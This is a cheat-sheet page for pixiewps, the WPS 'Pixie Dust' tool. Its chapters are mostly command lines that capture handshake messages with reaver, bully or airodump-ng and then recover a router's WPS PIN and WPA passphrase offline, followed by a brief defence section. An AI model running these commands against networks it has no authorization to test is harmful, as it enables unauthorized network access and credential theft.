---
title: pixiewps
category: credential_access
subcategory: wifi_credential
phase: 08
mitre_attack: TA0006
tags:
  - wireless
  - wps
  - pixie_dust
  - offline
  - pin
difficulty: intermediate
os: linux
install: sudo apt install pixiewps
github: https://github.com/wiire/pixiewps
related:
  - reaver
  - bully
  - wash
  - wifite
---

# pixiewps

## Chapter 1: Overview

**pixiewps** is an offline WPS brute force tool that exploits low or non-existing entropy in some access points' WPS implementations (the "Pixie Dust" attack). It computes WPS PINs offline from captured WPS protocol messages.

### Key Features

- **Offline computation**: No network interaction needed
- **Fast results**: Seconds instead of hours
- **Multiple modes**: RT/MT/CL, eCos, RTL819x
- **Session key recovery**: Extracts PSK and nonces
- **Minimal requirements**: Only captured WPS messages needed

### Vulnerability

```
WPS Pixie Dust Attack:
1. Capture M1-M3 from WPS handshake
2. Compute PIN offline using weak random seeds
3. Recover WPA passphrase
4. Works against vulnerable router firmware
```

---

## Chapter 2: Installation & Setup

```bash
sudo apt update && sudo apt install pixiewps
```

**Install size**: 118 KB

### Compile from Source

```bash
git clone https://github.com/wiire/pixiewps.git
cd pixiewps
make
sudo make install
```

---

## Chapter 3: Capturing WPS Messages

### With Reaver

```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K -vvv
```

### With Bully

```bash
bully -b AA:BB:CC:DD:EE:FF -c 6 -K -v 3
```

### Manual Capture

```bash
# Capture with airodump-ng
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wps_capture wlan0mon
```

---

## Chapter 4: Basic Usage

### Standard Pixie Dust Attack

```bash
pixiewps -e <PKE> -r <PKR> -s <E-HASH1> -z <E-HASH2> -n <E-NONCE>
```

### With Small DH Keys

```bash
pixiewps -e <PKE> -r <PKR> -s <E-HASH1> -z <E-HASH2> -n <E-NONCE> -S
```

### Verbose Output

```bash
pixiewps -e <PKE> -r <PKR> -s <E-HASH1> -z <E-HASH2> -n <E-NONCE> -v
```

---

## Chapter 5: Attack Modes

### Mode 1: RT/MT/CL (Default)

```bash
pixiewps --mode 1 -e <PKE> -r <PKR> -s <E-HASH1> -z <E-HASH2> -n <E-NONCE>
```

### Mode 2: eCos Simple

```bash
pixiewps --mode 2 -e <PKE> -r <PKR> -s <E-HASH1> -z <E-HASH2> -n <E-NONCE>
```

### Mode 3: RTL819x

```bash
pixiewps --mode 3 -e <PKE> -r <PKR> -7 <M7-ENC> -n <E-NONCE>
```

### Mode 4: eCos Simplest (Experimental)

```bash
pixiewps --mode 4 -e <PKE> -r <PKR> -s <E-HASH1> -z <E-HASH2>
```

---

## Chapter 6: Advanced Features

### Recover PSK with M5/M7

```bash
pixiewps -e <PKE> -r <PKR> -n <E-NONCE> -m <R-NONCE> -b <BSSID> -7 <M7-ENC> -5 <M5-ENC>
```

### Time Range (Mode 3)

```bash
pixiewps --mode 3 -e <PKE> -r <PKR> -7 <M7-ENC> --start 01/2010 --end 12/2020
```

### Force Current Time

```bash
pixiewps --mode 3 -e <PKE> -r <PKR> -7 <M7-ENC> --force
```

---

## Chapter 7: Real-World Scenarios

### Scenario 1: Quick Pixie Dust Test

```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K -vvv
pixiewps -e <captured_PKE> -r <captured_PKR> -s <captured_HASH1> -z <captured_HASH2> -n <captured_NONCE>
```

### Scenario 2: Against RTL819x Router

```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K -S -vvv
pixiewps --mode 3 -e <PKE> -r <PKR> -7 <M7> -n <NONCE> -m <R-NONCE> -b <BSSID>
```

### Scenario 3: Full Recovery

```bash
pixiewps -e <PKE> -r <PKR> -s <HASH1> -z <HASH2> -n <E-NONCE> -m <R-NONCE> -b <BSSID> -7 <M7> -5 <M5>
```

---

## Chapter 8: Mitigation & Defense

**Critical defenses:**

- **Disable WPS entirely** (only reliable fix)
- Update router firmware
- Use WPA3-SAE
- Monitor for WPS enumeration attempts
- Consider routers without WPS support

---

## Resources

- [pixiewps GitHub](https://github.com/wiire/pixiewps)
- [Pixie Dust Attack Explained](https:// forums.kali.org/showthread.php?25166)
- [WPS Security Research](https://www.wi-fi.org/discover-wi-fi/security)
- [OffSec PEN-210 Course](https://www.offsec.com/courses/pen-210/)

---

*Generated for educational purposes in authorized security testing environments only.*
